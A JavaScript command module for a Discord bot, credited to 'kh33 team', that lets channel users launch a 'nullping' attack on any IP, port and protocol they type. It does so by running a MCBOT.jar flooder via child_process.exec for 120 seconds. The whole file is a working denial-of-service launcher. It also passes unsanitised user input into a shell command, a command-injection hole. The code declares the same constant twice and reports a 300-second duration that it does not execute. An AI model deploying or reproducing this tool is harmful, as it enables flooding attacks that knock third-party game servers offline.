const Discord = require("discord.js");

exports.run = async (client, message, args) => {
const host = message.content.split (" ")[1]
const port = message.content.split (" ")[2]
const protocol = message.content.split (" ")[3]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Commands')
	.setDescription("`attack Command $nullping <IP> <Port> <Protocol> `")
	message.channel.send(embed1);
	return;
	}

if(!args[1]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`$nullping <IP> <Port> <Protocol>`")
	message.channel.send(embed1);
	return;
	}

if(!args[2]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('Warning')
	.setDescription("`Please Send valid Commnds !`")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`java -jar MCBOT.jar ${host}:${port} ${protocol} nullping 120 -1`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('ID User attack server discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **nullping** 🔥')
	.setTimestamp()
	.setDescription("**► attack nullpingbeta has stopped**")
	.setFooter('© Dev kh33 team !.', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 120000); //time in milliseconds
var gifler = ["https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif", "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif", "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif" , "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExMWFwYWdmaHhhbjZkMTZrdHF2bm4yd24xeTk5OTdqczd5Z2gwdzdqZiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/zzklOEpLxYyPptvDM9/giphy.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log(' ID User attack server discord:' +  message.guild.id)
const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🔥 **nullping** 🔥')
	.setTimestamp()
	.setDescription("**User**: `" + message.author.username + "` \n **Host**: `" + host + "` \n **Port**: `" + port + "` \n **Protocol**: `" + protocol + "`\n \n **🤖 Methods**: `nullping` \n **🔄 PingAmount**: `16 🚀` \n **🕒 Seconds**: `300`")
	.setFooter('© Dev kh33 team.', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['nullping'],
  permLevel: 0
}

exports.help = {
  name: 'nullping',
  description: 'Özel',
  usage: 'nullping'
}